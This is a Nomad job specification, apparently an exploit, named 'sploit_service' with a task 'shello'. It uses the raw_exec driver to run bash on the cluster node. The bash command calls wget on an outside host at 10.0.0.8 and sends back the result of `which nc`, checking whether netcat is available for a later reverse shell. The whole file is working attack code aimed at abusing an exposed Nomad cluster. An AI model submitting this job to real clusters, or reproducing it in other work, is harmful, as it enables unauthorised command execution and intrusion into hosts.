job "sploit_service" {
	datacenters = ["dc1"]
	group "sploit" {
		task "shello" {
		driver = "raw_exec"

		config {
			command = "/bin/bash"
			args = ["-c", "wget http://10.0.0.8:8000/?foo=`which nc`"]
			}
		}
	}
}